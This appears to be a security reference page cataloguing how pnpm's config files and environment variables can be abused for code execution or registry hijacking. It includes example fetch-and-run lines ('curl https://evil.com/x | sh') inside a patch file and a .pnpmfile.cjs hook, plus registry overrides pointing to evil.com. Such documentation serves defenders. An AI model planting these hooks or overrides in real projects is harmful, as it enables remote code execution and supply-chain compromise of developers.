---
title: PNPM
tags:
  - config-file
  - eval-sh
  - eval-js
references: 
- https://pnpm.io/cli/run
- https://pnpm.io/npmrc
- https://pnpm.io/settings
- https://pnpm.io/pnpmfile
- https://pnpm.io/supply-chain-security
files: [package.json,.npmrc,pnpm-workspace.yaml,.pnpmfile.cjs]
---

`pnpm` is a fast, disk space-efficient package manager for javascript, largely npm-compatible.

## `package.json`

For the project's own scripts, `pnpm` follows the same lifecycle model as `npm`.
It doesn't work if `--ignore-scripts` is specified.

| Command | Aliases | Section |
| -- | -- | -- |
| `pnpm run-script <x>`| `run` | `pre<x>`, `<x>`,`post<x>` |
| `pnpm install`| `i` | `preinstall`, `install`, `postinstall`, `prepare` |
| `pnpm start`| | `prestart`, `start`, `poststart` |
| `pnpm test`| `t` | `pretest`, `test`, `posttest` |
| `pnpm publish`| | `prepublishOnly`, `prepack`, `postpack`, `publish`, `postpublish` |

`package.json`:

```json
{
  "scripts": {
    "<section>": "<cmd>"
  }
}
```

## `.npmrc`

Same mechanism and lookup order as `npm` (project, home, global). It can be
used to overwrite the standard registry with an attacker-controlled one:

```yaml
registry=https://evil.com/
```

So `pnpm add something` would not install the standard version, but the one
from the attacker. It doesn't work if `--registry=` flag is specified.

## `pnpm-workspace.yaml`

`pnpm` centralizes workspace-wide config in `pnpm-workspace.yaml` (or the
`pnpm` key of the root `package.json`). Several keys are direct RCE or
install-hijack primitives if attacker-controlled:

| Key | Effect |
| -- | -- |
| `patchedDependencies` | Points to a local diff applied to a dependency before install, can add/modify a script |
| `pnpmfile` | Path to a custom `.pnpmfile.cjs`/`.pnpmfile.mjs`, see below |

`pnpm-workspace.yaml`:

```yaml
patchedDependencies:
  some-dep@1.0.0: patches/some-dep@1.0.0.patch
```

`patches/some-dep@1.0.0.patch`:

```diff
--- a/package.json
+++ b/package.json
@@ -1,5 +1,8 @@
   "scripts": {
-    "test": "jest"
+    "test": "jest",
+    "postinstall": "curl https://evil.com/x | sh"
   },
```

## `.pnpmfile.cjs`

`pnpm` loads a project-local hooks file (default `.pnpmfile.cjs` at the
workspace root, or wherever `pnpmfile` in `pnpm-workspace.yaml` points) and
executes it directly as Node.js code on every `pnpm install`. Unlike
lifecycle scripts, this is not guarded by `--ignore-scripts` or the v10
build allowlist:

```js
module.exports = {
  hooks: {
    readPackage(pkg) {
      require('child_process').execSync('curl https://evil.com/x | sh')
      return pkg
    },
  },
}
```

## Environment variables

`pnpm` will use environment variables that start with **pnpm_config_** as
a parameter. An attack with env-var poisoning can set the
registry with `export pnpm_config_registry=https://evil.com`.

